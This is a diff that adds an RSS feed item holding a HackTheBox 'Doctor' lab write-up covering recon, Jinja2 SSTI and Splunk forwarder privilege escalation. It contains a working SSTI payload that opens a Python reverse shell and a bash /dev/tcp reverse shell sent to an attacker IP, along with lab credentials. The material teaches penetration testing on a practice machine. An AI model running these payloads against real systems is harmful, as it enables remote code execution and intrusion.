@@ -8,6 +8,280 @@
     <lastBuildDate>Sat, 08 May 2021 23:21:45 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/splunk/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>HackTheBox - Doctor</title>
+      <link>https://fahmifj.github.io/hackthebox/doctor/</link>
+      <pubDate>Sat, 08 May 2021 23:21:45 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/hackthebox/doctor/</guid>
+      <description>Seven times seven is equal to SSTI</description>
+      <content:encoded><![CDATA[<p>Doctor is an easy difficulty Windows machine from HackTheBox that features a Flask web application which is vulnerable to blind Server-Side Template Injection. I&rsquo;m able to gain a foothold using the SSTI vulnerability. Enumerating on the Apache log files discovers a user&rsquo;s password. The user credentials are work on the Splunk Universal Forwarder service, which can be exploited to gain root access using PySplunkWhisperer2.</p>
+<h4 id="skills-learned">Skills Learned</h4>
+<ul>
+<li>Server Side Template Injection</li>
+<li>Splunk UF Exploitation</li>
+</ul>
+<h4 id="tools">Tools</h4>
+<ul>
+<li>
+<p>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></p>
+</li>
+<li>
+<p>Nmap - Preinstalled in Kali Linux</p>
+</li>
+<li>
+<p>Gobuster - <a href="https://github.com/OJ/gobuste">https://github.com/OJ/gobuste</a></p>
+</li>
+<li>
+<p>Tplmap - <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
+</li>
+<li>
+<p>SSTI Cheatsheet - <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#</a></p>
+</li>
+<li>
+<p>PySplunkWhisperer2 - <a href="https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py">https://github.com/cnotin/SplunkWhisperer2/blob/master/PySplunkWhisperer2/PySplunkWhisperer2_remote.py</a></p>
+</li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p>An initial scans discovers three open ports: SSH on port 22, HTTP server on port 80, and a Splunk daemon on port 8089 backed with HTTPS.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.3»
+$ mkdir nmap<span class="p">;</span> nmap -sC -sV -oN nmap/initial-doctor <span class="s1">&#39;10.10.10.209&#39;</span>
+Nmap scan report <span class="k">for</span> 10.10.10.209
+Host is up <span class="o">(</span>0.055s latency<span class="o">)</span>.
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+80/tcp   open  http     Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+<span class="p">|</span> http-methods:
+<span class="p">|</span>_  Supported Methods: POST OPTIONS HEAD GET
+<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_http-title: Doctor
+8089/tcp open  ssl/http Splunkd httpd
+<span class="p">|</span> http-methods:
+<span class="p">|</span>_  Supported Methods: GET HEAD OPTIONS
+<span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry
+<span class="p">|</span>_/
+<span class="p">|</span>_http-server-header: Splunkd
+<span class="p">|</span>_http-title: splunkd
+<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
+<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>SplunkCommonCA/organizationName<span class="o">=</span>Splunk/stateOrProvinceName<span class="o">=</span>CA/countryName<span class="o">=</span>US
+<span class="p">|</span> Public Key type: rsa
+<span class="p">|</span> Public Key bits: <span class="m">2048</span>
+<span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
+<span class="p">|</span> Not valid before: 2020-09-06T15:57:27
+<span class="p">|</span> Not valid after:  2023-09-06T15:57:27
+<span class="p">|</span> MD5:   db23 4e5c 546d <span class="m">8895</span> 0f5f 8f42 5e90 <span class="m">6787</span>
+<span class="p">|</span>_SHA-1: 7ec9 1bb7 343f f7f6 bdd7 d015 d720 6f6f 19e2 098b
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80 - Website</h3>
+<p>This page shows a kind of health service website called &ldquo;Doctor&rdquo; in the title.</p>
+<p><div class="img-container"><img src="imgs/image-20210509010426119.png" alt="image-20210509010426119"  /></div>
+</p>
+<h4 id="gobuster">Gobuster</h4>
+<p>URL brute force with <code>gobuster</code> didn&rsquo;t find any interesting results.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/images               (Status: 301) [Size: 313] [--&gt; http://10.10.10.209/images/]
+/js                   (Status: 301) [Size: 309] [--&gt; http://10.10.10.209/js/]
+/css                  (Status: 301) [Size: 310] [--&gt; http://10.10.10.209/css/]
+/contact.html         (Status: 200) [Size: 19848]
+/blog.html            (Status: 200) [Size: 19848]
+/about.html           (Status: 200) [Size: 19848]
+/index.html           (Status: 200) [Size: 19848]
+/services.html        (Status: 200) [Size: 19848]
+/fonts                (Status: 301) [Size: 312] [--&gt; http://10.10.10.209/fonts/]
+/departments.html     (Status: 200) [Size: 19848]
+/server-status        (Status: 403) [Size: 277]
+/index.html           (Status: 200) [Size: 19848]
+</code></pre></div><h3 id="tcp-80---doctorshtb">TCP 80 - doctors.htb</h3>
+<p>Because adding a machine name with &ldquo;.htb&rdquo; as TLD to <code>/etc/hosts</code> file has become my habit (i.e <code>doctor.htb</code>), so at first, on the homepage, I didn&rsquo;t notice that there is an additional &ldquo;s&rdquo; on <code>info@doctors.htb</code>.</p>
+<p><div class="img-container"><img src="imgs/image-20210509011106327.png" alt="image-20210509011106327"  /></div>
+</p>
+<p>Once I added <code>doctors.htb</code> to my <code>/etc/hosts</code> file, I refreshed the page with that hostname, and it presented a different web application.</p>
+<p><div class="img-container"><img src="imgs/image-20210509011333267.png" alt="image-20210509011333267"  /></div>
+</p>
+<p>In the page source, I found a comment telling that the archive feature is still in beta testing.</p>
+<p><div class="img-container"><img src="imgs/image-20210509013716799.png" alt="image-20210509013716799"  /></div>
+</p>
+<p>I&rsquo;ll note that <code>/archive</code>.</p>
+<h4 id="gobuster-1">Gobuster</h4>
+<p>I ran another gobuster scan, but it seems I&rsquo;ll just register an account this time.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text">/logout               (Status: 302) [Size: 217] [--&gt; http://doctors.htb/home]
+/register             (Status: 200) [Size: 4493]
+/login                (Status: 200) [Size: 4204]
+/home                 (Status: 302) [Size: 245] [--&gt; http://doctors.htb/login?next=%2Fhome]
+/archive              (Status: 200) [Size: 101]
+/account              (Status: 302) [Size: 251] [--&gt; http://doctors.htb/login?next=%2Faccount]
+/server-status        (Status: 403) [Size: 276]
+</code></pre></div><p>My account is only available for 20 minutes.</p>
+<p><div class="img-container"><img src="imgs/image-20210509014205880.png" alt="image-20210509014205880"  /></div>
+</p>
+<p>The &ldquo;1&rdquo; icon was actually a page number with URL of <code>http://doctors.htb/home?page=1</code>.</p>
+<h3 id="tcp-8089--splunk-universal-forwarder">TCP 8089  —  Splunk Universal Forwarder</h3>
+<p>I can visit the Splunk UF on port 8089 through the browser after adding HTTPS to the URL and accepting the SSL certificate warning.</p>
+<p>At the top, I can see the Splunk version.</p>
+<p><div class="img-container"><img src="imgs/image-20210509014443695.png" alt="image-20210509014443695"  /></div>
+</p>
+<h4 id="finding-vulnerability">Finding vulnerability</h4>
+<p>Knowing the version, I did a quick search on Google to look for available exploits, and I came across <code>hackbooktriks.xyz</code></p>
+<ul>
+<li><a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence">https://book.hacktricks.xyz/linux-unix/privilege-escalation/splunk-lpe-and-persistence</a></li>
+</ul>
+<p>The original research was published in here:</p>
+<ul>
+<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
+</ul>
+<p>But it requires credentials. I&rsquo;ll just add this to my to do list.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-web">Shell as web</h3>
+<h4 id="sql-injection---failed">SQL Injection - Failed</h4>
+<p>I can create a post message on <code>doctors.htb</code> by visiting <a href="http://doctors.htb/post/new">http://doctors.htb/post/new</a>. Below is the example request</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-HTTP" data-lang="HTTP"><span class="nf">POST</span> <span class="nn">/post/new</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="n">Host</span><span class="o">:</span> <span class="l">doctors.htb</span>
+<span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0</span>
+<span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+<span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+<span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="n">Referer</span><span class="o">:</span> <span class="l">http://doctors.htb/post/new</span>
+<span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="n">Content-Length</span><span class="o">:</span> <span class="l">35</span>
+<span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="n">Cookie</span><span class="o">:</span> <span class="l">session=.eJwlzj0OwjAMQOG7eGZI7MSJe5kq_hOsLZ0Qd6cS69Mbvg_secT5hO19XPGA_eWwQRMSDJdkRrMYOFNNMZvRdM5gth6jkLulV3JtOS1EFOsQGlNMDDXW_VN37GFzmbaGrWhiFq-r91aVlGWsdMV1ByYeZfJShBtynXH8NQjfH00QMJk.YBo8Bw.h165pwEGvKjGaPS-d3RiIO-xe34</span>
+<span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+title=test&amp;content=test&amp;submit=Post
+</code></pre></div><p>I fed the request to <code>SQLMap</code>, but it doesn&rsquo;t seem injectable.</p>
+<p>And then I looked into Wapplyzerーa web plugin that can be used to identify the technology stacks behind a websiteー, and it shows <code>doctors.htb</code> uses Flask as its backend.</p>
+<p><div class="img-container"><img src="imgs/136d4a7725d44c5a9de3b53bd18bfdb9.png" alt="136d4a7725d44c5a9de3b53bd18bfdb9"  /></div>
+</p>
+<h4 id="server-side-template-injection-ssti">Server Side Template Injection (SSTI)</h4>
+<p>Web applications that use Python Flask are typically run with a templating engine such as Jinja. On every templating engine, SSTI can occur when an un-sanitized user input is passed directly into the application templating process.</p>
+<blockquote>
+<p>PwnFunction’s video on <a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">SSTI</a> was very informative.</p>
+<p>TryHackMe also has a room called “<a href="https://tryhackme.com/room/flask">Flask</a>” that contains an example of SSTI attack on Flask. I have completed that room, and  the note is available on my <a href="https://github.com/fahmifj/TryHackMe-notes/tree/main/flask">GitHub</a>.</p>
+</blockquote>
+<p>Here is the methodology to detect SSTI (taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#methodology">here</a>):</p>
+<p><div class="img-container"><img src="imgs/serverside.png" alt="SSTI cheatsheet workflow"  /></div>
+</p>
+<p><code>http://doctors.htb/home?page=1</code> is the first attack vector to target. I used a tool called <code>Tplmap.py</code> to automatically detect SSTI, but no luck.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.3»
+$ python tplmap.py -u <span class="s1">&#39;http://doctors.htb/home?page=iamf&#39;</span>                             
+<span class="o">[</span>+<span class="o">]</span> Tplmap 0.5
+    Automatic Server-Side Template Injection Detection and Exploitation Tool
+<span class="o">[</span>+<span class="o">]</span> Testing <span class="k">if</span> GET parameter <span class="s1">&#39;page&#39;</span> is injectable
+<span class="o">[</span>+<span class="o">]</span> Smarty plugin is testing rendering with tag <span class="s1">&#39;*&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Smarty plugin is testing blind injection
+...&lt;SNIP&gt;...
+<span class="o">[</span>+<span class="o">]</span> Ruby plugin is testing blind injection
+<span class="o">[</span>+<span class="o">]</span> Ejs plugin is testing rendering with tag <span class="s1">&#39;*&#39;</span>
+<span class="o">[</span>+<span class="o">]</span> Ejs plugin is testing blind injection
+<span class="o">[</span>!<span class="o">][</span>checks<span class="o">]</span> Tested parameters appear to be not injectable.
+</code></pre></div><p>The second attack vector is <code>http://doctors.htb/post/new</code>, which allows me to create a post message. It consists of two input vectors: the title and the content/message.</p>
+<p><div class="img-container"><img src="imgs/image-20210509023608857.png" alt="image-20210509023608857"  /></div>
+</p>
+<p>I copied the basic SSTI payloads for Jinja2 from PayloadAllTheThings to the post content, but it doesn&rsquo;t return the expected result.</p>
+<p><div class="img-container"><img src="imgs/image-20210509024048415.png" alt="image-20210509024048415"  /></div>
+</p>
+<p>It also returns nothing when I submit the payloads on the title.</p>
+<p>After hours trying to figure out why it didn&rsquo;t work, I noticed that the <code>/archive</code> page occasionally returns an error when I put some payload that has the percentage symbol <code>{% payload %}</code> on the content/message section.</p>
+<p><div class="img-container"><img src="imgs/image-20210509024504730.png" alt="image-20210509024504730"  /></div>
+</p>
+<p>Or sometimes it only has the post title that can be seen only from page source.</p>
+<p><div class="img-container"><img src="imgs/image-20210509024707956.png" alt="image-20210509024707956"  /></div>
+</p>
+<p>So from there, I submitted the basic payload on the title.</p>
+<p><img src="imgs/image-20210509025456790.png" alt="image-20210509025456790" style="zoom:50%;" /></p>
+<p>Right after inserting the payload, I checked the page source of <code>/archive</code>, and I found the expected result of the SSTI payload there.</p>
+<p><div class="img-container"><img src="imgs/image-20210509025854497.png" alt="image-20210509025854497"  /></div>
+</p>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<p>The cheat-sheet from PayloadAllTheThings also contains a pre-crafted payload to get a reverse shell. All I have to do now is replace the IP address with mine and have my <code>nc</code> listener listening on the port I specified.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="p">{</span><span class="o">%</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="p">()</span><span class="o">.</span><span class="vm">__class__</span><span class="o">.</span><span class="n">__base__</span><span class="o">.</span><span class="n">__subclasses__</span><span class="p">()</span> <span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="k">if</span> <span class="s2">&#34;warning&#34;</span> <span class="ow">in</span> <span class="n">x</span><span class="o">.</span><span class="vm">__name__</span> <span class="o">%</span><span class="p">}{{</span><span class="n">x</span><span class="p">()</span><span class="o">.</span><span class="n">_module</span><span class="o">.</span><span class="n">__builtins__</span><span class="p">[</span><span class="s1">&#39;__import__&#39;</span><span class="p">](</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s2">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><span class="se">\&#34;</span><span class="s2">10.10.14.4</span><span class="se">\&#34;</span><span class="s2">,9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([</span><span class="se">\&#34;</span><span class="s2">/bin/sh</span><span class="se">\&#34;</span><span class="s2">,</span><span class="se">\&#34;</span><span class="s2">-i</span><span class="se">\&#34;</span><span class="s2">]);&#39;&#34;</span><span class="p">)}}{</span><span class="o">%</span><span class="n">endif</span><span class="o">%</span><span class="p">}{</span><span class="o">%</span> <span class="n">endfor</span> <span class="o">%</span><span class="p">}</span>
+</code></pre></div><p>I have an interactive shell now.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «doctor» «10.10.14.3» 
+$ nc -nvlp <span class="m">9000</span>            
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9000</span> ...
+connect to <span class="o">[</span>10.10.14.34<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.209<span class="o">]</span> <span class="m">5628</span>
+/bin/sh: 0: can’t access tty<span class="p">;</span> job control turned off
+$ which python
+$ which python3
+/usr/bin/python3
+$ python3 -c <span class="s1">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+web@doctor:~$ id
+<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>web<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-shaun">Shell as shaun</h3>
+<h4 id="internal-enumeration">Internal Enumeration</h4>
+<p>These are the users who a shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">web@doctor:~$ cat /etc/passwd <span class="p">|</span> grep sh$
+root:x:0:0:root:/root:/bin/bash
+web:x:1001:1001:,,,:/home/web:/bin/bash
+shaun:x:1002:1002:shaun,,,:/home/shaun:/bin/bash
+splunk:x:1003:1003:Splunk Server:/opt/splunkforwarder:/bin/bash
+</code></pre></div><p>Because <code>web</code> is a member of the <code>adm</code> group, I can read the log files at <code>/var/log</code>. While enumerating with <code>find</code> command, I caught an Apache2 log called &ldquo;backup&rdquo;.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">web@doctor:~$ find / -type f -readable -group adm 2&gt;/dev/null
+/var/log/kern.log.3.gz
+/var/log/auth.log
+/var/log/syslog
+/var/log/ufw.log.2.gz
+/var/log/dmesg.2.gz
+/var/log/auth.log.1
+...&lt;SNIP&gt;...
+/var/log/apache2/backup
+</code></pre></div><p>Searching string &ldquo;pass&rdquo; on the backup log finds this line.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">web@doctor:/var/log/apache2$ cat backup <span class="p">|</span> grep pass
+10.10.14.4 - - <span class="o">[</span>05/Sep/2020:11:17:34 +2000<span class="o">]</span> <span class="s2">&#34;POST /reset_password?email=Guitar123&#34;</span> <span class="m">500</span> <span class="m">453</span> <span class="s2">&#34;http://doctor.htb/reset_password&#34;</span>
+</code></pre></div><p>It printed as <code>email=Guitar123</code>, but it doesn&rsquo;t look like an email.</p>
+<h4 id="su---shaun">SU - shaun</h4>
+<p>It turns out that <code>Guitar123</code> is shaun&rsquo;s password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">web@doctor:/var/log/apache2$ su shaun
+Password: Guitar123
+web@doctor:/var/log/apache2$ id
+<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>shaun<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>shaun<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1002<span class="o">(</span>shaun<span class="o">)</span>
+</code></pre></div><p>User flag is done here.</p>
+<h3 id="shell-as-root">Shell as root</h3>
+<h4 id="exploiting-splunk-with-pysplunkwhisperer2">Exploiting Splunk with PySplunkWhisperer2</h4>
+<p>Recall the Splunk Forwarder, which by BookHackTrick is categorized as a privilege escalation vector.</p>
+<p>The researcher stated that the Splunk UF agent&rsquo;s username is always admin.</p>
+<blockquote>
+<p>Universal Forwarder is accessible on each host at https://host:8089. Accessing any of the protected API calls, such as /service/ pops up a  Basic authentication box. The username is always admin, and the password default used to be changeme until 2016 &hellip;</p>
+</blockquote>
+<p>But that&rsquo;s not the case on this machine, because I can use <code>shaun:Guitar123</code> to authenticate to the Splunk UF services on port 8089.</p>
+<p>I tried <a href="https://github.com/cnotin/SplunkWhisperer2">this PoC</a> from GitHub using the bash reverse shell as payload,</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.3»
+$ python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --port <span class="m">8089</span> --username shaun --password Guitar123 --payload <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.3/9001 0&gt;&amp;1&#39;&#34;</span> --lhost 10.10.14.3
+Running in remote mode <span class="o">(</span>Remote Code Execution<span class="o">)</span>
+<span class="o">[</span>.<span class="o">]</span> Authenticating...
+<span class="o">[</span>+<span class="o">]</span> Authenticated
+<span class="o">[</span>.<span class="o">]</span> Creating malicious app bundle...
+<span class="o">[</span>+<span class="o">]</span> Created malicious app bundle in: /tmp/tmpkwnss3rw.tar
+<span class="o">[</span>+<span class="o">]</span> Started HTTP server <span class="k">for</span> remote mode
+<span class="o">[</span>.<span class="o">]</span> Installing app from: http://10.10.14.3:8181/
+10.10.10.209 - - <span class="o">[</span>03/Feb/2021 05:09:23<span class="o">]</span> <span class="s2">&#34;GET / HTTP/1.1&#34;</span> <span class="m">200</span> -
+<span class="o">[</span>+<span class="o">]</span> App installed, your code should be running now!
+</code></pre></div><p>and it worked smoothly.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «doctor» «10.10.14.3» 
+$ nc -nvlp <span class="m">9001</span>
+listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">9001</span> ...
+connect to <span class="o">[</span>10.10.14.3<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.209<span class="o">]</span> <span class="m">48834</span>
+bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1137<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
+bash: no job control in this shell
+root@doctor:/# id
+id
+<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</code></pre></div><p>I can grab the root flag.</p>
+<p><div class="img-container"><img src="imgs/image-20210509042058603.png" alt="image-20210509042058603"  /></div>
+</p>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2</a></li>
+<li><a href="https://www.youtube.com/watch?v=SN6EVIG4c-0">https://www.youtube.com/watch?v=SN6EVIG4c-0</a></li>
+<li><a href="https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/">https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Doctor</title>
       <link>https://fahmifj.github.io/writeups/hackthebox/htb-doctor/</link>
       <pubDate>Sat, 08 May 2021 23:21:45 +0700</pubDate>
       
